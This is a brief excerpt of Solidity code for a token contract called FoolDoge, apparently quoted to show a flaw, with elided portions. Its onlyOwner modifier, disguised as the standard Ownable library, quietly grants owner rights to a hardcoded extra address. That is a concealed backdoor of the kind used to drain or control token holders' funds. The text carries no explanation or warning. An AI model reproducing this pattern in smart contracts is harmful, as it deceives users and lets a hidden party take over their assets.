...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x18Abd1Cbe80f6Ea41313Bac32A9d31947234b890) , "Ownable: caller is not the owner");
        _;
    }
...
contract FoolDoge is IERC20, Ownable {
